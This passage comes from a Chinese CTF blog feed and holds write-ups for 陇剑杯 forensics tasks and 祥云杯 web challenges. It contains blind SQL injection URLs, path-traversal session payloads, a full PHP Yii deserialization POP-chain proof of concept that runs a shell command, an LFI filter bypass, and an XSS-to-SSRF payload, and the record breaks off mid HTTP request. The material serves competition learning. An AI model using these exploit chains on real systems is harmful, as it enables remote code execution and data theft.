href="#3-6-3-7" class="headerlink" title="3.6 / 3.7"></a>3.6 / 3.7</h3><p>3-6 和 3-7 都可以在上传文件的 38 tcp 流中看到</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210914224654838.png"></p><p>跑一下就可以看到</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210914224728381.png"></p><h2 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h2><h3 id="4-1"><a href="#4-1" class="headerlink" title="4.1"></a>4.1</h3><p>直接看哪个是 200 即可 =&gt; <code>www.zip</code></p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210914224850573.png"></p><h3 id="4-2"><a href="#4-2" class="headerlink" title="4.2"></a>4.2</h3><p>最下面可以看到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?filename&#x3D;..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Ftmp%2Fsess_car&amp;content&#x3D;func%7CN%3Bfiles%7Ca%3A2%3A%7Bs%3A8%3A%22filename%22%3Bs%3A16%3A%22.%2Ffiles%2Ffilename%22%3Bs%3A20%3A%22call_user_func_array%22%3Bs%3A28%3A%22.%2Ffiles%2Fcall_user_func_array%22%3B%7Dpaths%7Ca%3A1%3A%7Bs%3A5%3A%22%2Fflag%22%3Bs%3A13%3A%22SplFileObject%22%3B%7D</span><br></pre></td></tr></table></figure><p>转码一下得到 =&gt; <code>sess_car</code></p><h3 id="4-3"><a href="#4-3" class="headerlink" title="4.3"></a>4.3</h3><p>根据 4-2 的上传内容即可得到 =&gt; SplFileObject</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?filename&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;sess_car&amp;content&#x3D;func|N;files|a:2:&#123;s:8:&quot;filename&quot;;s:16:&quot;.&#x2F;files&#x2F;filename&quot;;s:20:&quot;call_user_func_array&quot;;s:28:&quot;.&#x2F;files&#x2F;call_user_func_array&quot;;&#125;paths|a:1:&#123;s:5:&quot;&#x2F;flag&quot;;s:13:&quot;SplFileObject&quot;;&#125;</span><br></pre></td></tr></table></figure><h2 id="内存分析"><a href="#内存分析" class="headerlink" title="内存分析"></a>内存分析</h2><h3 id="6-1"><a href="#6-1" class="headerlink" title="6.1"></a>6.1</h3><p>需要的是虚拟机密码，直接下载文件下来后 mimikatz 一把梭</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210914225241701.png"></p><h2 id="简单日志分析"><a href="#简单日志分析" class="headerlink" title="简单日志分析"></a>简单日志分析</h2><h3 id="7-1"><a href="#7-1" class="headerlink" title="7.1"></a>7.1</h3><p>往后翻即可发现=&gt; <code>user</code></p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210914225443414.png"></p><h3 id="7-2"><a href="#7-2" class="headerlink" title="7.2"></a>7.2</h3><p>base64 解码第二个 user 参数传输的字符串即可得到 =&gt; /Th4s_IS_VERY_Import_Fi1e</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210914225541919.png"></p><h3 id="7-3"><a href="#7-3" class="headerlink" title="7.3"></a>7.3</h3><p>还是 base64 解码最后一个 user 参数的字符串 =&gt; <code>192.168.2.197:8888</code></p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210914225641792.png"></p><h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><h3 id="8-1"><a href="#8-1" class="headerlink" title="8.1"></a>8.1</h3><p>根据 id 参数的攻击可知为 布尔盲注</p><blockquote><p>/index.php?id=1%20and%20if(substr(database(),1,1)%20=%20’%C2%80’,1,(select%20table_name%20from%20information_schema.tables))</p></blockquote><h3 id="8-2"><a href="#8-2" class="headerlink" title="8.2"></a>8.2</h3><p>直接找到最后爆破 flag 的 payload 可以直接得到 =&gt; sqli#flag#flag</p><blockquote><p>/index.php?id=1%20and%20if(substr((select%20flag%20from%20sqli.flag),1,1)%20=%20’%C2%80’,1,(select%20table_name%20from%20information_schema.tables))</p></blockquote><h3 id="8-3"><a href="#8-3" class="headerlink" title="8.3"></a>8.3</h3><p>最好的方法就是直接写个脚本跑，但是懒得写了，直接找 =&gt; <code>flag&#123;deddcd67-bcfd-487e-b940-1217e668c7db&#125;</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;1st-陇剑杯部分WP&quot;&gt;&lt;a href=&quot;#1st-陇剑杯部分WP&quot; class=&quot;headerlink&quot; title=&quot;1st 陇剑杯部分WP&quot;&gt;&lt;/a&gt;1st 陇剑杯部分WP&lt;/h1&gt;&lt;h2 id=&quot;jwt&quot;&gt;&lt;a href=&quot;#jwt&quot; class=&quot;he</summary>
      
    
    
    
    <category term="WriteUp" scheme="https://rossweisse.github.io/categories/WriteUp/"/>
    
    
    <category term="CTF" scheme="https://rossweisse.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>第二届祥云杯部分WP</title>
    <link href="https://rossweisse.github.io/2021/08/23/WriteUp/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E7%A5%A5%E4%BA%91%E6%9D%AF/"/>
    <id>https://rossweisse.github.io/2021/08/23/WriteUp/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E7%A5%A5%E4%BA%91%E6%9D%AF/</id>
    <published>2021-08-23T09:44:40.000Z</published>
    <updated>2021-08-26T04:52:55.203Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="ezyii"><a href="#ezyii" class="headerlink" title="ezyii"></a>ezyii</h3><p>yii 的 pop链子，先贴poc:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Codeception</span>\<span class="title">Extension</span> &#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Faker</span>\<span class="title">DefaultGenerator</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">GuzzleHttp</span>\<span class="title">Psr7</span>\<span class="title">AppendStream</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span>  <span class="title">RunProcess</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$output</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$processes</span> = [];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;processes[] = <span class="keyword">new</span> DefaultGenerator(<span class="keyword">new</span> AppendStream());</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output = <span class="keyword">new</span> DefaultGenerator();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> base64_encode(serialize(<span class="keyword">new</span> RunProcess()));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">DefaultGenerator</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">default</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$default</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;default = <span class="variable">$default</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">GuzzleHttp</span>\<span class="title">Psr7</span> &#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Faker</span>\<span class="title">DefaultGenerator</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">AppendStream</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$streams</span> = [];</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$seekable</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;streams[] = <span class="keyword">new</span> CachingStream();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">CachingStream</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$remoteStream</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;remoteStream = <span class="keyword">new</span> DefaultGenerator(<span class="literal">false</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;stream = <span class="keyword">new</span>  PumpStream();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">PumpStream</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$source</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$size</span> = <span class="number">-10</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$buffer</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;buffer = <span class="keyword">new</span> DefaultGenerator();</span><br><span class="line">            <span class="keyword">include</span>(<span class="string">&quot;closure/autoload.php&quot;</span>);</span><br><span class="line">            <span class="variable">$a</span> = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">                system(<span class="string">&#x27;cat /f*&#x27;</span>);</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="variable">$a</span> = \Opis\<span class="built_in">Closure</span>\serialize(<span class="variable">$a</span>);</span><br><span class="line">            <span class="variable">$b</span> = unserialize(<span class="variable">$a</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="variable">$b</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>具体思路就是从 <code>RunProcess</code> 类入手</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">stopProcess</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span> (array_reverse(<span class="keyword">$this</span>-&gt;processes) <span class="keyword">as</span> <span class="variable">$process</span>) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!<span class="variable">$process</span>-&gt;isRunning()) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output-&gt;debug(<span class="string">&#x27;[RunProcess] Stopping &#x27;</span> . <span class="variable">$process</span>-&gt;getCommandLine());</span><br><span class="line">            <span class="variable">$process</span>-&gt;stop();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;processes = [];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里可以触发 <code>DefaultGenerator</code> 类中的 <code>__call</code> 魔术方法</p><p>然后由 return 可触发 <code>AppendStream</code> 类中的 <code>__toString</code> 魔术方法</p><p><code>AppendStream</code> 类中则可以通过 <code>$stream-&gt;rewind()</code> 去执行 <code>CachingStream</code> 类中的  <code>rewind()</code> 方法</p><p>然后通过 <code>CachingStream</code> 类中的 <code>$this-&gt;stream-&gt;read($length)</code> 去执行 <code>PumpStream</code> 类中的 <code>read()</code>方法，进而得到 <code>call_user_func</code> 函数的控制权，就可以注入 shell 了，这里用了构造 <code>function</code> 的方法，要注意直接构造然后执行 poc 是跑不通的，可以利用 <code>\Opis\Closure\serialize</code> 类中的序列化方法序列化后再反序列化绕过。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// AppendStream类</span></span><br><span class="line"><span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;streams <span class="keyword">as</span> <span class="variable">$i</span> =&gt; <span class="variable">$stream</span>) &#123;</span><br><span class="line">         <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="variable">$stream</span>-&gt;rewind();</span><br><span class="line">         &#125; <span class="keyword">catch</span> (\<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> \<span class="built_in">RuntimeException</span>(<span class="string">&#x27;Unable to seek stream &#x27;</span></span><br><span class="line">                . <span class="variable">$i</span> . <span class="string">&#x27; of the AppendStream&#x27;</span>, <span class="number">0</span>, <span class="variable">$e</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// CachingStream类</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># seek方法中</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$diff</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="variable">$diff</span> &gt; <span class="number">0</span> &amp;&amp; !<span class="keyword">$this</span>-&gt;remoteStream-&gt;eof()) &#123; <span class="comment">//这里要注意，为了能通过这一步进入到 read 方法，remoteStream 属性要修改，具体看poc</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;read(<span class="variable">$diff</span>);</span><br><span class="line">            <span class="variable">$diff</span> = <span class="variable">$byte</span> - <span class="keyword">$this</span>-&gt;stream-&gt;getSize();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;stream-&gt;seek(<span class="variable">$byte</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># read方法中</span></span><br><span class="line"><span class="variable">$data</span> = <span class="keyword">$this</span>-&gt;stream-&gt;read(<span class="variable">$length</span>);</span><br><span class="line"><span class="variable">$remaining</span> = <span class="variable">$length</span> - strlen(<span class="variable">$data</span>);</span><br></pre></td></tr></table></figure><p>flag:</p><blockquote><p>flag{e09e57a3-0060-4abf-97fe-e89cb9ebb2ba}</p></blockquote><h3 id="安全检测"><a href="#安全检测" class="headerlink" title="安全检测"></a>安全检测</h3><p>先是 SSRF 读文件，<code>http://127.0.0.1/admin/include123.php</code> </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$u</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$pattern</span> = <span class="string">&quot;\/\*|\*|\.\.\/|\.\/|load_file|outfile|dumpfile|sub|hex|where&quot;</span>;</span><br><span class="line"><span class="variable">$pattern</span> .= <span class="string">&quot;|file_put_content|file_get_content|fwrite|curl|system|eval|assert&quot;</span>;</span><br><span class="line"><span class="variable">$pattern</span> .=<span class="string">&quot;|passthru|exec|system|chroot|scandir|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restore&quot;</span>;</span><br><span class="line"><span class="variable">$pattern</span> .=<span class="string">&quot;|`|openlog|syslog|readlink|symlink|popepassthru|stream_socket_server|assert|pcntl_exec|http|.php|.ph|.log|\@|:\/\/|flag|access|error|stdout|stderr&quot;</span>;</span><br><span class="line"><span class="variable">$pattern</span> .=<span class="string">&quot;|file|dict|gopher&quot;</span>;</span><br><span class="line"><span class="comment">//累了累了，饮茶先</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$vpattern</span> = explode(<span class="string">&quot;|&quot;</span>,<span class="variable">$pattern</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$vpattern</span> <span class="keyword">as</span> <span class="variable">$value</span>)&#123;    </span><br><span class="line">    <span class="keyword">if</span> (preg_match( <span class="string">&quot;/<span class="subst">$value</span>/i&quot;</span>, <span class="variable">$u</span> ))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;检测到恶意字符&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$u</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ban了很多东西，用 <code>PHP_SESSION_UPLOAD_PROGRESS</code> 进行绕过。(注意一句话木马不能存在空格</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210821204720702.png"></p><p>获取到目录文件列表。</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210821204756344.png"></p><p>发现 <code>getflag.sh</code> 文件，直接执行就能拿到 flag 了。</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210821205010903.png"></p><p>flag:</p><blockquote><p>flag{57f1a008-f506-47a8-9174-ae307941d7b5}</p></blockquote><h3 id="secrets-of-admin-unsolve"><a href="#secrets-of-admin-unsolve" class="headerlink" title="secrets_of_admin(unsolve)"></a>secrets_of_admin(unsolve)</h3><p>这题之后复现感觉其实挺简单的，主要还是代码审计。</p><p>在 <code>database.ts</code> 中可以发现 <code>admin</code> 的 <code>password</code> =&gt; <code>e365655e013ce7fdbdbf8f27b418c8fe6dc9354dc4c0328fa02b0ea547659645</code> ，也可以知道 flag 的 checksum =&gt; <code>be5a14a8e504a66979f6938338b0662c</code>。</p><p>发现可以利用 127.0.0.1 添加文件记录的路由。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// You can also add file logs here!</span></span><br><span class="line">router.get(<span class="string">&#x27;/api/files&#x27;</span>, <span class="keyword">async</span> (req, res, next) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.socket.remoteAddress.replace(<span class="regexp">/^.*:/</span>, <span class="string">&#x27;&#x27;</span>) != <span class="string">&#x27;127.0.0.1&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> next(createError(<span class="number">401</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> &#123; username , filename, checksum &#125; = req.query;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span>(username) == <span class="string">&quot;string&quot;</span> &amp;&amp; <span class="keyword">typeof</span>(filename) == <span class="string">&quot;string&quot;</span> &amp;&amp; <span class="keyword">typeof</span>(checksum) == <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">await</span> DB.Create(username, filename, checksum)</span><br><span class="line">            <span class="keyword">return</span> res.send(<span class="string">&#x27;Done&#x27;</span>)</span><br><span class="line">        &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">            <span class="keyword">return</span> res.send(<span class="string">&#x27;Error!&#x27;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> res.send(<span class="string">&#x27;Parameters error&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>因此考虑将 flag 的文件同时属于 admin，这样就可以利用它的 checksum 进行读取，可以利用这个路由。(应该是个 html 转 pdf 的路由</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">router.post(<span class="string">&#x27;/admin&#x27;</span>, checkAuth, <span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> &#123; content &#125; = req.body;</span><br><span class="line">    <span class="keyword">if</span> ( content == <span class="string">&#x27;&#x27;</span> || content.includes(<span class="string">&#x27;&lt;&#x27;</span>) || content.includes(<span class="string">&#x27;&gt;&#x27;</span>) || content.includes(<span class="string">&#x27;/&#x27;</span>) || content.includes(<span class="string">&#x27;script&#x27;</span>) || content.includes(<span class="string">&#x27;on&#x27;</span>))&#123;</span><br><span class="line">        <span class="comment">// even admin can&#x27;t be trusted right ? :)  </span></span><br><span class="line">        <span class="keyword">return</span> res.render(<span class="string">&#x27;admin&#x27;</span>, &#123; <span class="attr">error</span>: <span class="string">&#x27;Forbidden word 🤬&#x27;</span>&#125;);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> template = <span class="string">`</span></span><br><span class="line"><span class="string">        &lt;html&gt;</span></span><br><span class="line"><span class="string">        &lt;meta charset=&quot;utf8&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;title&gt;Create your own pdfs&lt;/title&gt;</span></span><br><span class="line"><span class="string">        &lt;body&gt;</span></span><br><span class="line"><span class="string">        &lt;h3&gt;<span class="subst">$&#123;content&#125;</span>&lt;/h3&gt;</span></span><br><span class="line"><span class="string">        &lt;/body&gt;</span></span><br><span class="line"><span class="string">        &lt;/html&gt;</span></span><br><span class="line"><span class="string">        `</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">const</span> filename = <span class="string">`<span class="subst">$&#123;uuid()&#125;</span>.pdf`</span></span><br><span class="line">            pdf.create(template, &#123;</span><br><span class="line">                <span class="string">&quot;format&quot;</span>: <span class="string">&quot;Letter&quot;</span>,</span><br><span class="line">                <span class="string">&quot;orientation&quot;</span>: <span class="string">&quot;portrait&quot;</span>,</span><br><span class="line">                <span class="string">&quot;border&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">                <span class="string">&quot;type&quot;</span>: <span class="string">&quot;pdf&quot;</span>,</span><br><span class="line">                <span class="string">&quot;renderDelay&quot;</span>: <span class="number">3000</span>,</span><br><span class="line">                <span class="string">&quot;timeout&quot;</span>: <span class="number">5000</span></span><br><span class="line">            &#125;).toFile(<span class="string">`./files/<span class="subst">$&#123;filename&#125;</span>`</span>, <span class="keyword">async</span> (err, _) =&gt; &#123;</span><br><span class="line">                <span class="keyword">if</span> (err) next(createError(<span class="number">500</span>));</span><br><span class="line">                <span class="keyword">const</span> checksum = <span class="keyword">await</span> getCheckSum(filename);</span><br><span class="line">                <span class="keyword">await</span> DB.Create(<span class="string">&#x27;superuser&#x27;</span>, filename, checksum)</span><br><span class="line">                <span class="keyword">return</span> res.render(<span class="string">&#x27;admin&#x27;</span>, &#123; <span class="attr">message</span> : <span class="string">`Your pdf is successfully saved 🤑 You know how to download it right?`</span>&#125;);</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">            <span class="keyword">return</span> res.render(<span class="string">&#x27;admin&#x27;</span>, &#123; <span class="attr">error</span> : <span class="string">&#x27;Failed to generate pdf 😥&#x27;</span>&#125;)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>用 include 过滤了些东西，利用数组绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">content[]&#x3D;%3Cscript%3Evar%20url%3D%22http%3A%2F%2F127%2E0%2E0%2E1%3A8888%2Fapi%2Ffiles%3Fusername%3Dadmin%26filename%3D%2E%2E%2Ffiles%2Fflag%26checksum%3Dbe5a14a8e504a66979f6938338b0662c%22%3Bquery%3Dnew%20XMLHttpRequest%28%29%3Bquery%2Eopen%28%27get%27%2Curl%29%3Bquery%2Esend%28%29%3B%3C%2Fscript%3E</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;admin HTTP&#x2F;1.1</span><br><span class="line">Host: 189e45c2-c278-4154-a99a-f60a5dcb08c1.node4.buuoj.cn:81</span><br><span 